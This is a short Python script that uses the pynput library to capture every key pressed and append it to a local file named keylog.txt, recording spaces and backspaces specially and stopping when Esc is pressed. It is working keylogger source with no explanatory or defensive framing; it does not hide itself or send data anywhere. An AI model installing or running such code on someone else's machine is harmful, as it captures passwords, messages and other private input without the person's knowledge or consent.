from pynput import keyboard
import os

def main():
    with keyboard.Listener(
    on_press=on_press,
    on_release=on_release) as listener:
        listener.join()


def on_press(key):
    write_to_file(key)

def write_to_file(key):
    with open("keylog.txt", "a") as f:
        try:
            f.write(key.char)
        except:
            if key == keyboard.Key.space:
                f.write(' ')
            if key == keyboard.Key.backspace:
                f.write("<Backspace>")

def on_release(key):

    if key == keyboard.Key.esc:
        return False

main()
